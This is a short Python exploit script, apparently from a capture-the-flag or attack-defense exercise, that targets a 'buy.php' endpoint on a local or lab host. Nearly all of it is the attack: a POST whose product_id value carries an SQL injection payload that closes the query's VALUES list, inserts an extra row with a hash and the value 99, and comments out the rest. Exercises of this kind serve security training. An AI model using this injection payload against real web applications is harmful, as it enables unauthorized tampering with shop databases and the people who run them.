import requests, string
from pwn import *

URL = ""
if args.LOCAL:
    URL = "http://localhost:40003/"
else:
    URL = "http://10.45.1.2:16142/"
ALPH = string.printable
flag = ""

query = "1"

s = requests.Session()
r = s.get(URL)
r = s.post(URL + "buy.php", data={"product_id": "1), (\"6b30922b4174d51418a42610ebe1e986\", 99); -- -' OR 1=1 -- -"}, allow_redirects=False)
print(r.status_code, r.text)
risp = s.get(URL).text